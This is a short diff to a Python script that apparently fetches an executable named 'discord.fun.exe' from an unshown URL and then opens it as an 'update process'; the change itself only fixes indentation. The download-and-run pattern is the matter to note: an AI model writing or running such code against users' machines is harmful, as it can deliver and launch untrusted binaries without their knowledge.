@@ -44,9 +44,9 @@ def main():
     downloaded_file = os.path.join(dest_folder, "discord.fun.exe")
 
     downloaded_file = download_file(url, dest_folder)
-        if not downloaded_file:
-            print("Update process failed.")
-            return
+    if not downloaded_file:
+        print("Update process failed.")
+        return
 
     print(f"Attempting to open file: {downloaded_file}")
     open_file(downloaded_file)
